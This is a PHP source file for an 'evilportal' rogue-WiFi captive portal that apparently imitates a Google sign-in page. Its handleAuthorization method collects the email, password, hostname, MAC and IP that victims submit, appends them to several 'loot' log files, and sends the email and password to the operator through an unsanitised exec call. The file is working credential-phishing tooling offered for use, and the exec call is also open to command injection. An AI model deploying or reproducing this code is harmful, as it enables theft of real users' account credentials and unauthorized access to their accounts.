<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {

        $dirs = array(
            '/root/',
            '/opt/lampp/htdocs/',
        );
        // Original
        // $dirs = array(
        //     '/root/',
        //     '/sd/',
        // );

        $dirs = array_filter($dirs, 'file_exists');
        $dirs = array_filter($dirs, 'is_writeable');

        if (empty($dirs)) {
            die("die");
        }

        $dir = array_pop($dirs);
        $want = $dir . DIRECTORY_SEPARATOR . 'evilportal-logs';

        if (file_exists($want)) {
        }

        else {
            mkdir($want);
        }

        if (!file_exists($want)) {
        }

        if (!is_dir($want)) {
        }

        if (!is_writeable($want)) {
        }

        $want .= DIRECTORY_SEPARATOR;

        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
            file_put_contents("$dir/evilportal-logs/old-google-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
            file_put_contents("tmp/portal.log", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

            exec("pineapple notify $email' - '$pwd");
        }
        // handle form input or other extra things there

        // Store input in variable
        $email2 = isset($_POST['email']) ? $_POST['email'] : 'email';
        $pwd2 = isset($_POST['password']) ? $_POST['password'] : 'password';
        $hostname2 = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
        $mac2 = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
        $ip2 = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
        // Store all input variables in single "$loot" var
        $loot = "\nEmail: {$email2}\nPassword: {$pwd2}\nHostname: {$hostname2}\nMAC: {$mac2}\nIP: {$ip2}\n";

        // Open || Create file called lootfile.txt
        $fh = fopen("lootfile.txt", 'r+') or die("failed to create file");
        // Retrieve current contents of lootfile.txt
        $filecontent = fgets($fh);
        // Move cursor to the end of lootfile's contents
        fseek($fh, 0, SEEK_END);
        // Write the contents of "$loot" to lootfile.txt
        fwrite($fh, $loot) or die('Could not write to file');
        // Close the file
        fclose();

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
